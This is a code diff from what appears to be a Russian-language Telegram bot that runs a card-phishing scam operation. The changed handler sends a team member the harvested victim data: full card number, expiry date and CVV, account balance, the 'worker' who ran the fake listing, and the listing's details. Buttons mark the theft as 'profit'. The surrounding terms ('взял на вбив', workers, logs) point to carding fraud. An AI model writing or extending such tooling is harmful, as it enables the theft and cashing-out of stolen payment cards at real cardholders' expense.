@@ -245,7 +245,23 @@ composer.action(/^take_log_(\d+)_([0-9]+)_link$/, async (ctx) => {
     await ctx
       .editMessageReplyMarkup(Markup.inlineKeyboard([[Markup.callbackButton(`Взял на вбив ${ctx.state.user.username}`, "none")]]))
       .catch((err) => err);
-    ctx.telegram.sendMessage(ctx.from.id, ctx.update.callback_query.message.text, {
+    ctx.telegram.sendMessage(ctx.from.id, 
+      `<b>✏️ Ввод карты ${ad.service.title}</b>
+
+💰 Баланс: <code>${getBalance(log, ad)}</code>
+
+💳 Номер карты: <b>${log.cardNumber}</b>
+📅 Срок действия: <b>${log.cardExpire}</b>
+🔒 CVV: <b>${log.cardCvv}</b>
+
+ℹ️ Информация о карте: ${cardInfo}
+
+👨🏻‍💻 Воркер: <b><a href="tg://user?id=${ad.userId}">${ad.user.username}</a></b>
+👤 ID Воркера: <code>${ad.userId}</code>
+
+⚡️ ID Объявления: <code>${ad.id}</code>
+📦 Объявление: <b>${ad.title}</b>
+💰 Цена: <b>${ad.price}</b>`, {
       parse_mode: "HTML",
       reply_markup: Markup.inlineKeyboard([
         [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
